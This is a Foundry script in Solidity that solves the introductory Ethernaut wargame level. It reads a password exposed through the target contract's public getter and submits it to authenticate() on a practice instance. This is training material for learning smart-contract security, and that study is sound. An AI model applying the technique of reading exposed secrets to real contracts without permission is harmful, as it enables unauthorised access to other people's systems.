// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IHelloEthernaut {
    function password() external view returns (string memory);
    function authenticate(string calldata passkey) external;
}

/**
 * @title Challenge 00 Solution Script
 * @notice Read the public password and call authenticate()
 */
contract HelloEthernautSolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0xC7f04316A16A154e75074f7dcFEC36B5029725F3;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        IHelloEthernaut target = IHelloEthernaut(INSTANCE);

        // Step 1: Read the password (it's a public variable)
        string memory password = target.password();
        console.log("Password:", password);

        vm.startBroadcast(deployerPrivateKey);

        // Step 2: Authenticate with the password
        target.authenticate(password);

        vm.stopBroadcast();

        console.log("Challenge 00 completed!");
    }
}
